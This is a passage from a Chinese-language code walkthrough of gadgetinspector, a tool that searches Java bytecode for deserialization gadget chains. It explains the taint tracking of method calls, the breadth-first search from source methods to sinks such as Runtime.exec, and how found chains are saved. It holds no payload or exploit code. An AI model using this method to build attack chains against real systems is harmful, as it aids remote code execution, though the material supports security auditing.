class="line"></span><br><span class="line">    <span class="comment">// 调用 TaintTrackingMethodVisitor.visitFieldInsn 进行出/入栈操作</span></span><br><span class="line">    <span class="keyword">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitMethodInsn</code> 方法分析被调方法的操作数栈，栈中的元素要么为空集合，要么为能够传递污染的参数集合，模拟操作数栈的元素个数，但元素值是集合（模拟值，不是真实/实际值）。<br>最开始的时候已经将当前方法的参数以 <code>arg参数索引</code> 的形式存储到了本地变量表，当调用其他方法时，会从本地变量表加载数据到栈中，如果用到对象字段，则以 <code>arg参数索引.字段名称</code> 的形式入栈，因此根据栈中元素的名称就可以得知方法的哪些参数（根据名称判断）影响了被调方法的哪些参数（已知参数个数）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitMethodInsn</span><span class="params">(<span class="keyword">int</span> opcode, String owner, String name, String desc, <span class="keyword">boolean</span> itf)</span> </span>&#123;  <span class="comment">// 访问方法指令，方法指令是调用方法的指令。</span></span><br><span class="line">    <span class="comment">// 获取被调用方法的参数和类型，非静态方法需要把实例类型放在第一个元素</span></span><br><span class="line">    <span class="comment">// 根据描述符得出被调用方法的参数类型（占用空间大小）</span></span><br><span class="line">    Type[] argTypes = Type.getArgumentTypes(desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 非静态方法的第一个参数是对象本身，即 this</span></span><br><span class="line">    <span class="keyword">if</span> (opcode != Opcodes.INVOKESTATIC) &#123;   <span class="comment">// 非静态方法的第一个参数是实例</span></span><br><span class="line">        Type[] extendedArgTypes = <span class="keyword">new</span> Type[argTypes.length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(argTypes, <span class="number">0</span>, extendedArgTypes, <span class="number">1</span>, argTypes.length);</span><br><span class="line">        extendedArgTypes[<span class="number">0</span>] = Type.getObjectType(owner);    <span class="comment">// 对象类型</span></span><br><span class="line">        argTypes = extendedArgTypes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKESTATIC:      <span class="comment">// 调用静态方法</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEVIRTUAL:     <span class="comment">// 调用实例方法</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKESPECIAL:     <span class="comment">// 调用超类构造方法，实例初始化方法，私有方法</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEINTERFACE:   <span class="comment">// 调用接口方法</span></span><br><span class="line">            <span class="keyword">int</span> stackIndex = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// 被调用方法的操作数栈</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                <span class="comment">// 最右边的参数，就是最后入栈，即在栈顶</span></span><br><span class="line">                <span class="keyword">int</span> argIndex = argTypes.length - <span class="number">1</span> - i; <span class="comment">// 参数索引</span></span><br><span class="line">                Type type = argTypes[argIndex]; <span class="comment">// 参数类型</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 参数从右往左入栈，因此最右边的参数在栈底</span></span><br><span class="line">                Set&lt;String&gt; taint = getStackTaint(stackIndex);</span><br><span class="line">                <span class="keyword">if</span> (taint.size() &gt; <span class="number">0</span>) &#123; <span class="comment">// 如果存在能够传递污染的参数</span></span><br><span class="line">                    <span class="comment">// 遍历参数</span></span><br><span class="line">                    <span class="keyword">for</span> (String argSrc : taint) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!argSrc.substring(<span class="number">0</span>, <span class="number">3</span>).equals(<span class="string">&quot;arg&quot;</span>)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Invalid taint arg: &quot;</span> + argSrc);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// arg数字.字段名称</span></span><br><span class="line">                        <span class="keyword">int</span> dotIndex = argSrc.indexOf(<span class="string">&#x27;.&#x27;</span>); <span class="comment">// 分隔位置</span></span><br><span class="line">                        <span class="keyword">int</span> srcArgIndex;    <span class="comment">// 第几个参数</span></span><br><span class="line">                        String srcArgPath;</span><br><span class="line">                        <span class="keyword">if</span> (dotIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">                            srcArgIndex = Integer.parseInt(argSrc.substring(<span class="number">3</span>));</span><br><span class="line">                            srcArgPath = <span class="keyword">null</span>;  <span class="comment">// 没有名称</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            srcArgIndex = Integer.parseInt(argSrc.substring(<span class="number">3</span>, dotIndex));</span><br><span class="line">                            srcArgPath = argSrc.substring(dotIndex + <span class="number">1</span>);  <span class="comment">// 字段名称</span></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 记录参数流动关系</span></span><br><span class="line">                        <span class="comment">// argIndex：当前方法参数索引；srcArgIndex：对应上一级方法的参数索引</span></span><br><span class="line">                        discoveredCalls.add(<span class="keyword">new</span> GraphCall(</span><br><span class="line">                                <span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(<span class="keyword">this</span>.owner), <span class="keyword">this</span>.name, <span class="keyword">this</span>.desc),</span><br><span class="line">                                <span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(owner), name, desc),</span><br><span class="line">                                srcArgIndex,</span><br><span class="line">                                srcArgPath,</span><br><span class="line">                                argIndex));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 往左一个参数</span></span><br><span class="line">                stackIndex += type.getSize();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 TaintTrackingMethodVisitor.visitMethodInsn 执行出/入栈操作</span></span><br><span class="line">    <span class="keyword">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>save</code> 方法存储分析得到的调用关系信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用工厂方法存储调用关系信息</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">&quot;callgraph.dat&quot;</span>), <span class="keyword">new</span> GraphCall.Factory(), discoveredCalls);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-GadgetChainDiscovery"><a href="#8-GadgetChainDiscovery" class="headerlink" title="8. GadgetChainDiscovery"></a>8. GadgetChainDiscovery</h2><p>针对不同的挖掘类型，污点源信息收集的实现不同，这里关注 Java 原生序列化的污点源，分析已经在 <strong>0x02 项目结构 - gadgetinspector/javaserial - SimpleSourceDiscovery</strong> 一节中给出。</p><p>挖掘利用链实际就是找一条从 source 点到 sink 点的路径，前面收集的信息都是为了这里的搜索做准备。</p><p>这里定义了两个类分别表示利用链和利用链上的的节点（即方法）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 利用链</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">GadgetChain</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;GadgetChainLink&gt; links;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">GadgetChain</span><span class="params">(List&lt;GadgetChainLink&gt; links)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.links = links;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">GadgetChain</span><span class="params">(GadgetChain gadgetChain, GadgetChainLink link)</span> </span>&#123;</span><br><span class="line">        List&lt;GadgetChainLink&gt; links = <span class="keyword">new</span> ArrayList&lt;GadgetChainLink&gt;(gadgetChain.links);</span><br><span class="line">        links.add(link);</span><br><span class="line">        <span class="keyword">this</span>.links = links;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用链（节点）</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">GadgetChainLink</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle method;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> taintedArgIndex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">GadgetChainLink</span><span class="params">(MethodReference.Handle method, <span class="keyword">int</span> taintedArgIndex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.method = method;</span><br><span class="line">        <span class="keyword">this</span>.taintedArgIndex = taintedArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> == o) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        GadgetChainLink that = (GadgetChainLink) o;</span><br><span class="line">        <span class="keyword">if</span> (taintedArgIndex != that.taintedArgIndex) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> method != <span class="keyword">null</span> ? method.equals(that.method) : that.method == <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = method != <span class="keyword">null</span> ? method.hashCode() : <span class="number">0</span>;</span><br><span class="line">        result = <span class="number">31</span> * result + taintedArgIndex;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>discover</code> 方法首先加载方法信息、继承信息，调用 <code>InheritanceDeriver.getAllMethodImplementations</code> 获取方法的重写信息，分析也已经在 <strong>0x02 项目结构</strong> 一节中给出，并保存到文件中，再加载上一步得到的调用关系信息。</p><p>然后加载污点源信息，将每个 source 方法作为初始节点创建一条链，加入待分析的链集合。遍历集合中的链，取出链并从尾节点（方法）开始分析，第一次分析污点源，如果其参数索引与被调方法的参数索引相同，则创建新节点并加入链的最末端，如果被调方法不是 sink 点，则加入待分析的链集合，否则加入发现的利用链集合。之后重复上面的步骤，集合中待分析的链会越来越长，直到所有链都被弹出和分析完毕。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 搜索可能的利用链，保存到 gadget-chains.txt 中</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 加载方法信息</span></span><br><span class="line">    Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">    <span class="comment">// 加载继承信息（inheritanceMap：子类-&gt;父类集合，subClassMap：父类-&gt;子类集合）</span></span><br><span class="line">    InheritanceMap inheritanceMap = InheritanceMap.load();</span><br><span class="line">    <span class="comment">// 加载重写信息：方法-&gt;重写方法集合</span></span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = InheritanceDeriver.getAllMethodImplementations(</span><br><span class="line">            inheritanceMap, methodMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回目标方法的可序列化重写方法（包括目标方法本身）</span></span><br><span class="line">    <span class="keyword">final</span> ImplementationFinder implementationFinder = config.getImplementationFinder(</span><br><span class="line">            methodMap, methodImplMap, inheritanceMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存重写信息到 methodimpl.dat：（缩进）类名 方法名 描述符</span></span><br><span class="line">    <span class="keyword">try</span> (Writer writer = Files.newBufferedWriter(Paths.get(<span class="string">&quot;methodimpl.dat&quot;</span>))) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodImplMap.entrySet()) &#123;</span><br><span class="line">            writer.write(entry.getKey().getClassReference().getName());</span><br><span class="line">            writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            writer.write(entry.getKey().getName());</span><br><span class="line">            writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            writer.write(entry.getKey().getDesc());</span><br><span class="line">            writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (MethodReference.Handle method : entry.getValue()) &#123;</span><br><span class="line">                writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                writer.write(method.getClassReference().getName());</span><br><span class="line">                writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                writer.write(method.getName());</span><br><span class="line">                writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                writer.write(method.getDesc());</span><br><span class="line">                writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载调用关系信息</span></span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (GraphCall graphCall : DataLoader.loadData(Paths.get(<span class="string">&quot;callgraph.dat&quot;</span>), <span class="keyword">new</span> GraphCall.Factory())) &#123;</span><br><span class="line">        MethodReference.Handle caller = graphCall.getCallerMethod();</span><br><span class="line">        <span class="keyword">if</span> (!graphCallMap.containsKey(caller)) &#123;</span><br><span class="line">            Set&lt;GraphCall&gt; graphCalls = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">            graphCalls.add(graphCall);</span><br><span class="line">            graphCallMap.put(caller, graphCalls);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            graphCallMap.get(caller).add(graphCall);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 已经访问过的方法（节点）</span></span><br><span class="line">    Set&lt;GadgetChainLink&gt; exploredMethods = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="comment">// 待分析的链</span></span><br><span class="line">    LinkedList&lt;GadgetChain&gt; methodsToExplore = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    <span class="comment">// 加载所有 sources，并将每个 source 分别作为链的第一个节点</span></span><br><span class="line">    <span class="keyword">for</span> (Source source : DataLoader.loadData(Paths.get(<span class="string">&quot;sources.dat&quot;</span>), <span class="keyword">new</span> Source.Factory())) &#123;</span><br><span class="line">        <span class="comment">// 创建节点</span></span><br><span class="line">        GadgetChainLink srcLink = <span class="keyword">new</span> GadgetChainLink(source.getSourceMethod(), source.getTaintedArgIndex());</span><br><span class="line">        <span class="keyword">if</span> (exploredMethods.contains(srcLink)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 创建仅有一个节点的链</span></span><br><span class="line">        methodsToExplore.add(<span class="keyword">new</span> GadgetChain(Arrays.asList(srcLink)));</span><br><span class="line">        <span class="comment">// 将方法标记为已访问</span></span><br><span class="line">        exploredMethods.add(srcLink);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环次数</span></span><br><span class="line">    <span class="keyword">long</span> iteration = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 保存找到的利用链</span></span><br><span class="line">    Set&lt;GadgetChain&gt; discoveredGadgets = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="comment">// BFS 搜索 source 到 sink 的利用链</span></span><br><span class="line">    <span class="keyword">while</span> (methodsToExplore.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((iteration % <span class="number">1000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            LOGGER.info(<span class="string">&quot;Iteration &quot;</span> + iteration + <span class="string">&quot;, Search space: &quot;</span> + methodsToExplore.size());</span><br><span class="line">        &#125;</span><br><span class="line">        iteration += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        GadgetChain chain = methodsToExplore.pop(); <span class="comment">// 取出一条链</span></span><br><span class="line">        GadgetChainLink lastLink = chain.links.get(chain.links.size() - <span class="number">1</span>); <span class="comment">// 取这条链最后一个节点（方法）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取当前方法与其被调方法的调用关系</span></span><br><span class="line">        Set&lt;GraphCall&gt; methodCalls = graphCallMap.get(lastLink.method);</span><br><span class="line">        <span class="keyword">if</span> (methodCalls != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (GraphCall graphCall : methodCalls) &#123;</span><br><span class="line">                <span class="comment">// 如果当前方法的污染参数与被调方法受方法参数影响的索引不一致则跳过（即第 index 个参数）</span></span><br><span class="line">                <span class="comment">// 判断 source 时，索引指出能够被攻击者控制的参数</span></span><br><span class="line">                <span class="keyword">if</span> (graphCall.getCallerArgIndex() != lastLink.taintedArgIndex) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 获取被调方法的可序列化重写信息</span></span><br><span class="line">                Set&lt;MethodReference.Handle&gt; allImpls = implementationFinder.getImplementations(graphCall.getTargetMethod());</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 遍历被调方法的重写方法</span></span><br><span class="line">                <span class="keyword">for</span> (MethodReference.Handle methodImpl : allImpls) &#123;</span><br><span class="line">                    GadgetChainLink newLink = <span class="keyword">new</span> GadgetChainLink(methodImpl, graphCall.getTargetArgIndex());</span><br><span class="line">                    <span class="comment">// 如果被调方法已经被访问过了，则跳过，减少开销</span></span><br><span class="line">                    <span class="comment">// 但是跳过会使其他链在经过此节点时断掉</span></span><br><span class="line">                    <span class="comment">// 而去掉这步可能会遇到环状问题，造成路径无限增加</span></span><br><span class="line">                    <span class="keyword">if</span> (exploredMethods.contains(newLink)) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 新节点（被调方法）与之前的链组成新链</span></span><br><span class="line">                    GadgetChain newChain = <span class="keyword">new</span> GadgetChain(chain, newLink);</span><br><span class="line">                    <span class="comment">// 判断被调方法是否为 sink 点，如果是则加入利用链集合</span></span><br><span class="line">                    <span class="keyword">if</span> (isSink(methodImpl, graphCall.getTargetArgIndex(), inheritanceMap)) &#123;</span><br><span class="line">                        discoveredGadgets.add(newChain);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 否则将新链加入待分析的链集合，被调方法加入已访问的方法集合</span></span><br><span class="line">                        methodsToExplore.add(newChain);</span><br><span class="line">                        exploredMethods.add(newLink);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将搜索到的利用链保存到 gadget-chains.txt</span></span><br><span class="line">    <span class="keyword">try</span> (OutputStream outputStream = Files.newOutputStream(Paths.get(<span class="string">&quot;gadget-chains.txt&quot;</span>));</span><br><span class="line">         Writer writer = <span class="keyword">new</span> OutputStreamWriter(outputStream, StandardCharsets.UTF_8)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (GadgetChain chain : discoveredGadgets) &#123;</span><br><span class="line">            printGadgetChain(writer, chain);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Found &#123;&#125; gadget chains.&quot;</span>, discoveredGadgets.size());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>isSink</code> 方法判断方法（和参数）是否触发预定义的 JDK 中的 sink 点，比如 <code>Runtime.exec</code> 方法。 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 预定义的 sink 点</span></span><br><span class="line"><span class="comment"> * Represents a collection of methods in the JDK that we consider to be &quot;interesting&quot;. If a gadget chain can</span></span><br><span class="line"><span class="comment"> * successfully 